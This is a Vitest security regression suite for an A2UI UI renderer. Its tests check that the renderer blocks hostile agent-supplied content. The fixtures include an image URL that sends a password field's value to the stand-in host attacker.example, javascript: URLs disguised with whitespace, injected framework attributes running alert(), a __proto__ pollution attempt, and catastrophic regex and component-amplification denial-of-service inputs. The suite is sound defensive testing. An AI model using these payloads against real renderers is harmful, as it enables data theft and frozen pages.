// @vitest-environment jsdom
import { beforeAll, describe, expect, it } from 'vitest';
import type { SduiCatalog } from '../lib/catalog.js';
import { A2UI_BASIC_CATALOG_ID, a2uiBasicCatalog } from '../a2ui/basic.js';
import type { A2uiRendererMessage } from '../a2ui/messages.js';
import { A2uiSurfaces, MAX_SURFACES } from '../a2ui/surfaces.js';
import { patchChildren } from './dom.js';
import { type A2uiSurfaceElement, defineA2uiSurface } from './element.js';
import { checkUrl, createEvaluator, type ReportedError } from './evaluate.js';
import { renderA2uiHtml } from './html.js';
import { MAX_DRAWS } from './render.js';
import { h } from './view.js';
import { parseA2uiMessage } from '../a2ui/messages.js';

/**
 * Regressions for what the code review and the security audit of the renderer found, each built
 * from the input that showed it.
 */

const B = A2UI_BASIC_CATALOG_ID;
const create = (surfaceId: string, extra: Record<string, unknown> = {}) => ({
  version: '1.0',
  createSurface: { surfaceId, catalogId: B, ...extra },
});
const update = (surfaceId: string, components: unknown[]) => ({
  version: '1.0',
  updateComponents: { surfaceId, components },
});

beforeAll(() => {
  defineA2uiSurface({ tag: 'review-surface' });
});
function mount(): { element: A2uiSurfaceElement; sent: A2uiRendererMessage[] } {
  const element = document.createElement(
    'review-surface',
  ) as A2uiSurfaceElement;
  const sent: A2uiRendererMessage[] = [];
  element.addEventListener('a2ui:message', (event) =>
    sent.push((event as CustomEvent).detail),
  );
  document.body.append(element);
  return { element, sent };
}
const flush = () => new Promise((resolve) => setTimeout(resolve, 0));
/** The markup a page shows: the HTML without the messages it carries for the renderer. */
const markup = (html: string) =>
  html.replace(/<script type="application\/a2ui\+json">[\s\S]*?<\/script>/, '');

describe('amplification is bounded', () => {
  it('a few shared components cannot draw millions of times', () => {
    const components: unknown[] = [];
    for (let level = 0; level < 6; level++)
      components.push({
        id: level === 0 ? 'root' : `c${level}`,
        component: 'Column',
        children: Array(10).fill(level === 5 ? 'leaf' : `c${level + 1}`),
      });
    components.push({ id: 'leaf', component: 'Text', text: 'x' });
    const start = performance.now();
    const { html, errors } = renderA2uiHtml([
      create('s'),
      update('s', components),
    ]);
    expect(performance.now() - start).toBeLessThan(3_000);
    expect(html.length).toBeLessThan(5_000_000);
    expect(errors.map((e) => e.message)).toContain(
      `the surface draws more than ${MAX_DRAWS} components; the rest are not drawn`,
    );
    expect(html).toContain('data-a2ui-truncated');
  });

  it('nested templates over a long list are bounded too', () => {
    const start = performance.now();
    const { errors } = renderA2uiHtml([
      create('s', { dataModel: { items: Array(1_000).fill(0) } }),
      update('s', [
        {
          id: 'root',
          component: 'Column',
          children: { path: '/items', componentId: 't1' },
        },
        {
          id: 't1',
          component: 'Column',
          children: { path: '/items', componentId: 't2' },
        },
        { id: 't2', component: 'Text', text: 'x' },
      ]),
    ]);
    expect(performance.now() - start).toBeLessThan(3_000);
    expect(
      errors.some((e) => /more than 10000 components/.test(e.message)),
    ).toBe(true);
  });

  it('a binding to the whole of a large data model is not stringified on every draw', () => {
    const { html } = renderA2uiHtml([
      create('s', {
        dataModel: { big: Array.from({ length: 50_000 }, (_, i) => i) },
      }),
      update('s', [{ id: 'root', component: 'Text', text: { '@path': '/' } }]),
    ]);
    expect(markup(html).length).toBeLessThan(10_000);
  });
});

describe('media cannot carry data away', () => {
  const stream = (policy?: object) =>
    renderA2uiHtml(
      [
        create('s', { dataModel: { form: { pw: 'hunter2' } } }),
        update('s', [
          { id: 'root', component: 'Column', children: ['img', 'pw'] },
          {
            id: 'img',
            component: 'Image',
            url: {
              '@call': 'formatString',
              args: { value: 'https://attacker.example/p?d=${/form/pw}' },
            },
          },
          {
            id: 'pw',
            component: 'TextField',
            label: 'Password',
            variant: 'obscured',
            value: { '@path': '/form/pw' },
          },
        ]),
      ],
      policy ? { urlPolicy: policy } : {},
    ).html;

  it('refuses a media URL to a host the page did not name', () => {
    const html = markup(stream());
    expect(html).not.toContain('attacker.example');
    expect(html).not.toContain('hunter2"');
    expect(html).toContain('data-a2ui-state="blocked-url"');
  });

  it('loads it once the page names the host', () => {
    expect(stream({ mediaHosts: ['attacker.example'] })).toContain(
      'src="https://attacker.example/p?d=hunter2"',
    );
  });

  it('marks an agent’s password field as one no password manager should fill', () => {
    expect(stream()).toMatch(
      /type="password"[^>]*autocomplete="new-password"|autocomplete="new-password"[^>]*type="password"/,
    );
  });
});

describe('URLs in disguise', () => {
  it.each([
    ' javascript:alert(1)',
    '﻿javascript:alert(1)',
    '　javascript:alert(1)',
    'javascript:alert(1) ',
  ])('%j is refused for every use', (url) => {
    for (const use of ['link', 'image', 'media'] as const)
      expect(checkUrl(url, use).ok).toBe(false);
    const opened: string[] = [];
    const errors: ReportedError[] = [];
    createEvaluator({
      model: () => ({}),
      report: (e) => errors.push(e),
      openUrl: (u) => opened.push(u),
    }).activate({
      '@call': 'openUrl',
      args: { url },
    });
    expect(opened).toEqual([]);
    expect(errors[0]).toMatchObject({ code: 'EXPRESSION_ERROR' });
    expect(errors[0]?.message).toMatch(/blocked-url/);
  });
});

describe('host elements get no attribute names from content', () => {
  const catalog: SduiCatalog = {
    ...a2uiBasicCatalog,
    components: {
      ...a2uiBasicCatalog.components,
      Badge: {
        contract: {
          skewContract: '1',
          name: 'sdui.component.Badge',
          current: 1,
          steps: [],
          schemas: {
            '1': {
              type: 'object',
              properties: {
                label: { type: 'string' },
                tone: { type: 'string' },
              },
            },
          },
        },
      },
    },
  };

  it('mirrors only the declared scalar props, and never a framework directive, slot, class or key', () => {
    const { html } = renderA2uiHtml(
      [
        create('s'),
        update('s', [
          {
            id: 'root',
            component: 'Badge',
            label: 'New',
            tone: 'hx-on:click',
            'x-init': 'alert(document.domain)',
            'hx-on:click': 'alert(1)',
            slot: 'header',
            class: 'overlay',
            popover: 'manual',
            'data-a2ui-key': 'evil',
          },
        ]),
      ],
      { catalog, registry: { Badge: { element: 'host-badge' } } },
    );
    const open = /<host-badge[^>]*>/.exec(html)![0];
    const names = [...open.matchAll(/\s([^\s=>]+)(?==|\s|>)/g)].map(
      (m) => m[1],
    );
    expect(open).toContain('label="New"');
    expect(open).toContain('tone="hx-on:click"'); // a value is just a value
    expect(names.sort()).toEqual([
      'data-a2ui-id',
      'data-a2ui-key',
      'label',
      'tone',
    ]);
    expect(open).toContain('data-a2ui-key="root"');
  });

  it('an undeclared component gets its props as data only', () => {
    const { html } = renderA2uiHtml(
      [
        create('s'),
        update('s', [
          { id: 'root', component: 'Card', child: 't', 'x-init': 'alert(1)' },
          { id: 't', component: 'Text', text: 'x' },
        ]),
      ],
      { registry: { Card: { element: 'host-card' } } },
    );
    expect(/<host-card[^>]*>/.exec(html)![0]).not.toContain('x-init');
  });
});

describe('controls an agent draws stay out of host forms and host ids', () => {
  it('uses opaque names and ids, and a form no page has', () => {
    const { html } = renderA2uiHtml([
      create('csrf'),
      update('csrf', [
        { id: 'root', component: 'Column', children: ['pick', 'tabs'] },
        {
          id: 'pick',
          component: 'ChoicePicker',
          options: [{ label: 'Admin', value: 'admin' }],
          value: [],
        },
        { id: 'tabs', component: 'Tabs', tabs: [{ title: 'A', child: 'a' }] },
        { id: 'a', component: 'Text', text: 'a' },
      ]),
    ]);
    const radio = /<input[^>]*type="radio"[^>]*>/.exec(html)![0];
    expect(radio).toMatch(/name="a2ui-[0-9a-z]+"/);
    expect(radio).not.toMatch(/csrf|pick/);
    expect(radio).toContain('form="a2ui-detached"');
    expect(/role="tab"[^>]*>/.exec(html)![0]).toMatch(/id="a2ui-[0-9a-z]+"/);
  });
});

describe('instances in a template keep their own state', () => {
  it('checking one item’s unbound checkbox checks only that one', async () => {
    const { element } = mount();
    element.push([
      create('list', { dataModel: { items: [1, 2, 3] } }),
      update('list', [
        {
          id: 'root',
          component: 'List',
          children: { path: '/items', componentId: 'row' },
        },
        { id: 'row', component: 'CheckBox', label: 'Pick', value: false },
      ]),
    ]);
    await flush();
    const boxes = () => [
      ...element.querySelectorAll<HTMLInputElement>('input[type="checkbox"]'),
    ];
    expect(boxes()).toHaveLength(3);
    boxes()[0]!.checked = true;
    boxes()[0]!.dispatchEvent(new Event('change', { bubbles: true }));
    await flush();
    expect(boxes().map((box) => box.checked)).toEqual([true, false, false]);
    element.remove();
  });
});

describe('the patcher keeps focus when a sibling goes', () => {
  it('removing an earlier sibling neither moves nor blurs the focused input', () => {
    const parent = document.createElement('div');
    document.body.append(parent);
    patchChildren(parent, [
      h('p', { key: 'a' }, 'first'),
      h('input', { key: 'b' }),
    ]);
    const input = parent.querySelector('input')!;
    input.focus();
    patchChildren(parent, [h('input', { key: 'b' })]);
    expect(parent.querySelector('input')).toBe(input);
    expect(document.activeElement).toBe(input);
    parent.remove();
  });
});

describe('formatString interpolates only what was written as a template', () => {
  it('text someone typed is shown, not evaluated', () => {
    const model = { userText: 'see ${/secret}', secret: 'TOKEN' };
    const e = createEvaluator({ model: () => model, report: () => undefined });
    expect(
      e.text({
        '@call': 'formatString',
        args: { value: { '@path': '/userText' } },
      }),
    ).toBe('see ${/secret}');
    expect(
      e.text({
        '@call': 'formatString',
        args: { value: '${formatString(value:${/userText})}' },
      }),
    ).toBe('see ${/secret}');
    expect(
      e.text({
        '@call': 'formatString',
        args: { value: 'literal ${/secret}' },
      }),
    ).toBe('literal TOKEN');
  });

  it('an argument named __proto__ is an argument', () => {
    const e = createEvaluator({
      model: () => ({ obj: { a: 1 } }),
      report: () => undefined,
    });
    expect(
      e.text({
        '@call': 'formatString',
        args: {
          value: "${pluralize(value: 2, other: 'x', __proto__: ${/obj})}",
        },
      }),
    ).toBe('x');
    expect(({} as Record<string, unknown>)['a']).toBeUndefined();
  });
});

describe('streams', () => {
  it('a bad line costs that line only', async () => {
    const { element, sent } = mount();
    element.push(
      [
        JSON.stringify(create('s')),
        '{"version":"1.0","nope":',
        JSON.stringify(
          update('s', [{ id: 'root', component: 'Text', text: 'ok' }]),
        ),
      ].join('\n'),
    );
    await flush();
    expect(element.querySelector('[data-a2ui-id="root"]')?.textContent).toBe(
      'ok',
    );
    expect(sent).toHaveLength(1);
    expect(sent[0]).toMatchObject({ error: { code: 'VALIDATION_FAILED' } });
    element.remove();
  });

  it('a renderer holds a bounded number of surfaces', () => {
    const surfaces = new A2uiSurfaces();
    for (let i = 0; i < MAX_SURFACES; i++)
      surfaces.apply(parseA2uiMessage(create(`s${i}`)));
    expect(() =>
      surfaces.apply(parseA2uiMessage(create('one-too-many'))),
    ).toThrow(/at most 64 surfaces/);
  });
});

describe('tabs from the keyboard', () => {
  it('arrow keys move to the next tab', async () => {
    const { element } = mount();
    element.push([
      create('t'),
      update('t', [
        {
          id: 'root',
          component: 'Tabs',
          tabs: [
            { title: 'One', child: 'a' },
            { title: 'Two', child: 'b' },
          ],
        },
        { id: 'a', component: 'Text', text: 'first' },
        { id: 'b', component: 'Text', text: 'second' },
      ]),
    ]);
    await flush();
    const tab = element.querySelector<HTMLButtonElement>('[role="tab"]')!;
    tab.dispatchEvent(
      new KeyboardEvent('keydown', { key: 'ArrowRight', bubbles: true }),
    );
    await flush();
    expect(
      [...element.querySelectorAll('[role="tab"]')].map((t) =>
        t.getAttribute('aria-selected'),
      ),
    ).toEqual(['false', 'true']);
    expect(
      element.querySelector('[role="tabpanel"]:not([hidden])')?.textContent,
    ).toBe('second');
    element.remove();
  });
});

describe('what the second verification found', () => {
  it('an exhausted regex budget is an EXPRESSION_ERROR, and the rest of the surface still draws', () => {
    const value = 'a'.repeat(4_096);
    const start = performance.now();
    const { html, errors } = renderA2uiHtml([
      create('s'),
      update('s', [
        { id: 'root', component: 'Column', children: ['f', 'ok'] },
        {
          id: 'f',
          component: 'TextField',
          label: 'x',
          value,
          '@checks': [
            {
              condition: {
                '@call': 'regex',
                args: { value, pattern: '(a?){999}b' },
              },
              message: 'no',
            },
          ],
        },
        { id: 'ok', component: 'Text', text: 'still here' },
      ]),
    ]);
    expect(performance.now() - start).toBeLessThan(3_000);
    expect(markup(html)).toContain('still here');
    expect(
      errors.some(
        (e) => e.code === 'EXPRESSION_ERROR' && /budget/.test(e.message),
      ),
    ).toBe(true);
  });

  it('many matches share one budget per draw, so they cannot add up to a frozen page', () => {
    const call = {
      '@call': 'regex',
      args: { value: 'a'.repeat(400), pattern: '(a?){400}b' },
    };
    const start = performance.now();
    renderA2uiHtml([
      create('s'),
      update('s', [
        {
          id: 'root',
          component: 'TextField',
          label: 'x',
          value: 'v',
          '@checks': [
            {
              condition: {
                '@call': 'and',
                args: { values: Array(250).fill(call) },
              },
            },
          ],
        },
      ]),
    ]);
    expect(performance.now() - start).toBeLessThan(3_000);
  });

  it('a URL that names its scheme is absolute, whatever the page is served over', () => {
    expect(checkUrl('https:attacker.example/i?d=hunter2', 'image').ok).toBe(
      false,
    );
    expect(checkUrl('https:attacker.example/i?d=hunter2', 'media').ok).toBe(
      false,
    );
    expect(
      checkUrl('https:attacker.example/', 'link', { hosts: ['example.com'] })
        .ok,
    ).toBe(false);
    expect(
      checkUrl('https:images.example/a.png', 'image', {
        mediaHosts: ['images.example'],
      }),
    ).toEqual({ ok: true, url: 'https://images.example/a.png' });
  });

  it('a list naming one component 120,000 times draws a bounded number and does not overflow', () => {
    const start = performance.now();
    const { html, errors } = renderA2uiHtml([
      create('s'),
      update('s', [
        { id: 'root', component: 'Row', children: Array(120_000).fill('t') },
        { id: 't', component: 'Text', text: 'x' },
      ]),
    ]);
    expect(performance.now() - start).toBeLessThan(3_000);
    expect(
      errors.some((e) => /more than 10000 components/.test(e.message)),
    ).toBe(true);
    expect(markup(html).length).toBeLessThan(5_000_000);
  });

  it('many drawings of one long text are bounded by what they cost, not only by their count', () => {
    const long = 'word '.repeat(4_000);
    const start = performance.now();
    const { errors } = renderA2uiHtml([
      create('s', { dataModel: { items: Array(100).fill(0) } }),
      update('s', [
        {
          id: 'root',
          component: 'Column',
          children: { path: '/items', componentId: 'row' },
        },
        {
          id: 'row',
          component: 'Column',
          children: { path: '/items', componentId: 'cell' },
        },
        { id: 'cell', component: 'Text', text: long },
      ]),
    ]);
    expect(performance.now() - start).toBeLessThan(3_000);
    expect(
      errors.some((e) => /more text than one draw allows/.test(e.message)),
    ).toBe(true);
  });
});

describe('what the third verification found: one budget for all of a draw', () => {
  const timed = <T>(work: () => T): { result: T; ms: number } => {
    const start = performance.now();
    const result = work();
    return { result, ms: performance.now() - start };
  };

  it('labels count as text: a thousand labels bound to one long string are bounded', () => {
    const { result, ms } = timed(() =>
      renderA2uiHtml([
        create('s', {
          dataModel: { items: Array(1_000).fill(0), long: 'x'.repeat(100_000) },
        }),
        update('s', [
          {
            id: 'root',
            component: 'Column',
            children: { path: '/items', componentId: 'box' },
          },
          {
            id: 'box',
            component: 'CheckBox',
            label: { '@path': '/long' },
            value: false,
          },
        ]),
      ]),
    );
    expect(ms).toBeLessThan(3_000);
    expect(markup(result.html).length).toBeLessThan(3_000_000);
    expect(
      result.errors.some((e) =>
        /more text than one draw allows/.test(e.message),
      ),
    ).toBe(true);
  });

  it('the budget is shared by every surface of a page', () => {
    const call = {
      '@call': 'regex',
      args: { value: 'a'.repeat(400), pattern: '(a?){400}b' },
    };
    const messages = Array.from({ length: 64 }, (_, i) => [
      create(`s${i}`),
      update(`s${i}`, [
        {
          id: 'root',
          component: 'TextField',
          label: 'x',
          value: 'v',
          '@checks': [
            {
              condition: {
                '@call': 'and',
                args: { values: Array(250).fill(call) },
              },
            },
          ],
        },
      ]),
    ]).flat();
    expect(timed(() => renderA2uiHtml(messages)).ms).toBeLessThan(3_000);
  });

  it('renderer function calls between draws share the element’s budget', async () => {
    const { element } = mount();
    element.push([
      create('s', { dataModel: {} }),
      update('s', [{ id: 'root', component: 'Text', text: 'x' }]),
    ]);
    await flush();
    const start = performance.now();
    element.push(
      Array.from({ length: 300 }, (_, i) => ({
        version: '1.0',
        callRendererFunction: {
          functionCallId: `f${i}`,
          surfaceId: 's',
          callFunction: {
            '@call': 'regex',
            catalogId: B,
            args: { value: 'a'.repeat(400), pattern: '(a?){400}b' },
          },
        },
      })),
    );
    expect(performance.now() - start).toBeLessThan(3_000);
    element.remove();
  });

  it('nested counted lookaheads are refused before they are built', () => {
    for (const pattern of [
      '(?:(?!(?:b{999}){20})){1000}x',
      '(?:(?!(?:(?!(?:b{999}){20})){1000})){50}',
    ]) {
      const errors: ReportedError[] = [];
      const e = createEvaluator({
        model: () => ({}),
        report: (error) => errors.push(error),
      });
      const { ms } = timed(() =>
        e.value({
          '@call': 'regex',
          args: { value: 'b'.repeat(4_000), pattern },
        }),
      );
      expect(ms).toBeLessThan(500);
      expect(errors[0]?.message).toMatch(/more than 20000 instructions/);
    }
  });

  it('formatDate with a long format, many times, is cheap', () => {
    const format = 'yyyy MM dd HH mm ss '.repeat(13).slice(0, 256);
    const value = Array.from(
      { length: 254 },
      () =>
        `\${formatDate(value: '2026-02-02T15:17:00Z', format: '${format}')}`,
    ).join('');
    const { ms } = timed(() =>
      renderA2uiHtml(
        [
          create('s'),
          update('s', [
            {
              id: 'root',
              component: 'Text',
              text: { '@call': 'formatString', args: { value } },
            },
          ]),
        ],
        { timeZone: 'UTC' },
      ),
    );
    expect(ms).toBeLessThan(2_000);
  });

  it('tabs and options count against the draw budget', () => {
    const tabs = Array.from({ length: 10_000 }, (_, i) => ({
      title: `t${i}`,
      child: 'x',
    }));
    const options = Array.from({ length: 500 }, (_, i) => ({
      label: `o${i}`,
      value: `${i}`,
    }));
    const { result, ms } = timed(() =>
      renderA2uiHtml([
        create('s', { dataModel: { items: Array(1_000).fill(0) } }),
        update('s', [
          {
            id: 'root',
            component: 'Column',
            children: ['tabsList', 'pickers'],
          },
          { id: 'tabsList', component: 'Tabs', tabs },
          { id: 'x', component: 'Text', text: 'x' },
          {
            id: 'pickers',
            component: 'Column',
            children: { path: '/items', componentId: 'pick' },
          },
          { id: 'pick', component: 'ChoicePicker', options, value: [] },
        ]),
      ]),
    );
    expect(ms).toBeLessThan(3_000);
    expect((markup(result.html).match(/<input/g) ?? []).length).toBeLessThan(
      10_001,
    );
    expect(
      result.errors.some((e) => /more than 10000 components/.test(e.message)),
    ).toBe(true);
  });

  it('server-sent events accumulate in linear time', async () => {
    const body = 'data:\n'.repeat(200_000);
    const original = globalThis.fetch;
    globalThis.fetch = (async () =>
      new Response(body, {
        headers: { 'content-type': 'text/event-stream' },
      })) as typeof fetch;
    try {
      const { element, sent } = mount();
      const start = performance.now();
      element.setAttribute('src', '/stream');
      for (let i = 0; i < 100 && sent.length === 0; i++)
        await new Promise((resolve) => setTimeout(resolve, 20));
      expect(performance.now() - start).toBeLessThan(3_000);
      expect(sent.length).toBeGreaterThan(0);
      element.remove();
    } finally {
      globalThis.fetch = original;
    }
  });
});
